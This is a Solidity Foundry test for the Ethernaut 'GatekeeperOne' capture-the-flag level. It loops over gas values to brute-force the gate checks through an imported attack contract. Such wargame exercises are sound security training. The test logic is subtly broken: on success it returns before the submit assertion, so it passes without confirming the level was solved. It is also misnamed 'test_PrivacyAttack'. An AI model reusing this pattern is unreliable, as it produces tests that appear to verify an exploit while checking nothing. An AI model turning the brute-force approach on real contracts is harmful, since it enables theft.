// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {GatekeeperOneFactory} from "../src/13-GatekeeperOne/GatekeeperOneFactory.sol";
import {GatekeeperOneAttack} from "../src/13-GatekeeperOne/GatekeeperOneAttack.sol";

contract GatekeeperOneTest is Test {
    Ethernaut public ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_PrivacyAttack() public {
        // SETUP
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);

        // ATTACK
        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(levelAddress);
        for (uint256 i = 100; i < 8191; i++) {
            try gatekeeperOneAttack.attack(i) {
                console.log("gas", i);
                return;
            } catch {}
        }

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
    }
}
